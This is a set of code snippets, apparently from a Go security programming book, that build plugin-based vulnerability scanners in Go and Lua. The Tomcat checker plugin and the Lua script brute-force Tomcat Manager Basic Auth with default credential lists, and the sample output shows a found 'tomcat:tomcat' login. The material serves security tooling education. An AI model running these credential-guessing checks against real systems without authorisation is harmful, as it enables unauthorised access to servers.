["```\nFile file = new File(\"/path/to/classes/\");\nURL[] urls = new URL[]{file.toURL()};\nClassLoader cl = new URLClassLoader(urls);\nClass clazz = cl.loadClass(\"com.example.MyClass\");\nclazz.getConstructor().newInstance().someMethod();\n```", "```\n$ go build -buildmode=plugin\n```", "```\n$ go build -buildmode=c-shared\n```", "```\n$ tree\n.\n--- cmd\n    --- scanner\n        --- main.go\n--- plugins\n--- scanner\n    --- scanner.go\n```", "```\n   package scanner\n\n   // Scanner defines an interface to which all checks adhere\n❶ type Checker interface {\n    ❷ Check(host string, port uint64) *Result\n   }\n\n   // Result defines the outcome of a check\n❸ type Result struct {\n       Vulnerable bool\n       Details    string\n   }\n```", "```\nconst PluginsDir = \"../../plugins/\" ❶\n\nfunc main() {\n    var (\n        files []os.FileInfo\n        err   error\n        p     *plugin.Plugin\n        n     plugin.Symbol\n        check scanner.Checker\n res   *scanner.Result\n    )  \n    if files, err = ioutil.ReadDir(PluginsDir)❷; err != nil {\n        log.Fatalln(err)\n    }  \n\n    for idx := range files { ❸\n        fmt.Println(\"Found plugin: \" + files[idx].Name())\n        if p, err = plugin.Open(PluginsDir + \"/\" + files[idx].Name())❹; err != nil {\n            log.Fatalln(err)\n        }\n\n        if n, err = p.Lookup(\"New\")❺; err != nil {\n            log.Fatalln(err)\n        }\n\n        newFunc, ok := n.(func() scanner.Checker) ❻\n        if !ok {\n            log.Fatalln(\"Plugin entry point is no good. Expecting: func New() scanner.Checker{ ... }\")\n        }\n        check = newFunc()❼\n        res = check.Check(\"10.0.1.20\", 8080) ❽\n        if res.Vulnerable { ❾\n            log.Println(\"Host is vulnerable: \" + res.Details)\n        } else {\n            log.Println(\"Host is NOT vulnerable\")\n        }\n    }  \n}\n```", "```\nimport (\n    // Some snipped for brevity\n    \"github.com/bhg/ch-10/plugin-core/scanner\" ❶\n)\n\nvar Users = []string{\"admin\", \"manager\", \"tomcat\"}\nvar Passwords = []string{\"admin\", \"manager\", \"tomcat\", \"password\"}\n\n// TomcatChecker implements the scanner.Check interface. Used for guessing Tomcat creds\ntype TomcatChecker struct{} ❷\n\n// Check attempts to identify guessable Tomcat credentials\nfunc (c *TomcatChecker) Check(host string, port uint64) *scanner.Result { ❸\n    var (\n        resp   *http.Response\n        err    error\n        url    string\n        res    *scanner.Result\n        client *http.Client\n        req    *http.Request\n    )  \n    log.Println(\"Checking for Tomcat Manager...\")\n res = new(scanner.Result) ❹\n    url = fmt.Sprintf(\"http://%s:%d/manager/html\", host, port)\n    if resp, err = http.Head(url); err != nil {\n        log.Printf(\"HEAD request failed: %s\\n\", err)\n        return res\n    }  \n    log.Println(\"Host responded to /manager/html request\")\n    // Got a response back, check if authentication required\n    if resp.StatusCode != http.StatusUnauthorized || resp.Header.Get(\"WWW-Authenticate\") == \"\" {\n        log.Println(\"Target doesn't appear to require Basic auth.\")\n        return res\n    }  \n\n    // Appears authentication is required. Assuming Tomcat manager. Guess passwords...\n    log.Println(\"Host requires authentication. Proceeding with password guessing...\")\n    client = new(http.Client)\n    if req, err = http.NewRequest(\"GET\", url, nil); err != nil {\n        log.Println(\"Unable to build GET request\")\n        return res\n    }\n    for _, user := range Users {\n        for _, password := range Passwords {\n            req.SetBasicAuth(user, password)\n            if resp, err = client.Do(req); err != nil {\n                log.Println(\"Unable to send GET request\")\n                continue\n            }\n            if resp.StatusCode == http.StatusOK { ❺\n                res.Vulnerable = true\n                res.Details = fmt.Sprintf(\"Valid credentials found - %s:%s\", user, password)\n                return res\n            }  \n        }  \n    }  \n    return res\n}\n\n// New is the entry point required by the scanner\nfunc New() scanner.Checker { ❻\n    return new(TomcatChecker)\n}\n```", "```\n$ go build -buildmode=plugin -o /path/to/plugins/tomcat.so\n```", "```\n$ go run main.go\nFound plugin: tomcat.so\n2020/01/15 15:45:18 Checking for Tomcat Manager...\n2020/01/15 15:45:18 Host responded to /manager/html request\n2020/01/15 15:45:18 Host requires authentication. Proceeding with password guessing...\n2020/01/15 15:45:18 Host is vulnerable: Valid credentials found - tomcat:tomcat\n```", "```\n$ go get github.com/yuin/gopher-lua\n```", "```\nfunc head(l *lua.LState❶) int {\n    var (\n        host string\n        port uint64\n        path string\n        resp *http.Response\n        err  error\n        url  string\n    )\n ❷ host = l.CheckString(1)\n    port = uint64(l.CheckInt64(2))\n    path = l.CheckString(3)\n    url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n    if resp, err = http.Head(url); err != nil {\n     ❸ l.Push(lua.LNumber(0))\n        l.Push(lua.LBool(false))\n        l.Push(lua.LString(fmt.Sprintf(\"Request failed: %s\", err)))\n     ❹ return 3\n    }\n ❺ l.Push(lua.LNumber(resp.StatusCode))\n    l.Push(lua.LBool(resp.Header.Get(\"WWW-Authenticate\") != \"\"))\n    l.Push(lua.LString(\"\"))\n ❻ return 3\n}\n```", "```\nfunc get(l *lua.LState) int {\n    var (\n        host     string\n        port     uint64\n        username string\n        password string\n        path     string\n        resp     *http.Response\n        err      error\n        url      string\n        client   *http.Client\n        req      *http.Request\n    )  \n    host = l.CheckString(1)\n    port = uint64(l.CheckInt64(2))\n ❶ username = l.CheckString(3)\n    password = l.CheckString(4)\n    path = l.CheckString(5)\n    url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n client = new(http.Client)\n    if req, err = http.NewRequest(\"GET\", url, nil); err != nil {\n        l.Push(lua.LNumber(0))\n        l.Push(lua.LBool(false))\n        l.Push(lua.LString(fmt.Sprintf(\"Unable to build GET request: %s\", err)))\n        return 3\n    }  \n    if username != \"\" || password != \"\" {\n        // Assume Basic Auth is required since user and/or password is set\n        req.SetBasicAuth(username, password)\n    }  \n    if resp, err = client.Do(req); err != nil {\n        l.Push(lua.LNumber(0))\n        l.Push(lua.LBool(false))\n        l.Push(lua.LString(fmt.Sprintf(\"Unable to send GET request: %s\", err)))\n        return 3\n    }\n    l.Push(lua.LNumber(resp.StatusCode))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(\"\"))\n    return 3\n}\n```", "```\n❶ const LuaHttpTypeName = \"http\"\n\n   func register(l *lua.LState) {\n    ❷ mt := l.NewTypeMetatable(LuaHttpTypeName)\n    ❸ l.SetGlobal(\"http\", mt)\n       // static attributes\n    ❹ l.SetField(mt, \"head\", l.NewFunction(head))\n       l.SetField(mt, \"get\", l.NewFunction(get))\n   }\n```", "```\n❶ const PluginsDir = \"../../plugins\"\n\n   func main() {\n       var (\n           l     *lua.LState\n           files []os.FileInfo\n           err   error\n           f     string\n       )\n    ❷ l = lua.NewState()\n       defer l.Close()\n    ❸ register(l)\n    ❹ if files, err = ioutil.ReadDir(PluginsDir); err != nil {\n           log.Fatalln(err)\n       }\n\n    ❺ for idx := range files {\n           fmt.Println(\"Found plugin: \" + files[idx].Name())\n           f = fmt.Sprintf(\"%s/%s\", PluginsDir, files[idx].Name())\n        ❻ if err := l.DoFile(f); err != nil {\n               log.Fatalln(err)\n           }\n       }\n   }\n```", "```\nusernames = {\"admin\", \"manager\", \"tomcat\"}\npasswords = {\"admin\", \"manager\", \"tomcat\", \"password\"}\n\nstatus, basic, err = http.head(\"10.0.1.20\", 8080, \"/manager/html\") ❶\nif err ~= \"\" then\n    print(\"[!] Error: \"..err)\n    return\nend\nif status ~= 401 or not basic then\n    print(\"[!] Error: Endpoint does not require Basic Auth. Exiting.\")\n    return\nend\nprint(\"[+] Endpoint requires Basic Auth. Proceeding with password guessing\")\nfor i, username in ipairs(usernames) do\n    for j, password in ipairs(passwords) do\n        status, basic, err = http.get(\"10.0.1.20\", 8080, username, password, \"/manager/html\") ❷\n        if status == 200 then\n            print(\"[+] Found creds - \"..username..\":\"..password)\n            return\n        end\n    end\nend\n```", "```\n$ go run main.go\nFound plugin: tomcat.lua\n[+] Endpoint requires Basic Auth. Proceeding with password guessing\n[+] Found creds - tomcat:tomcat\n```"]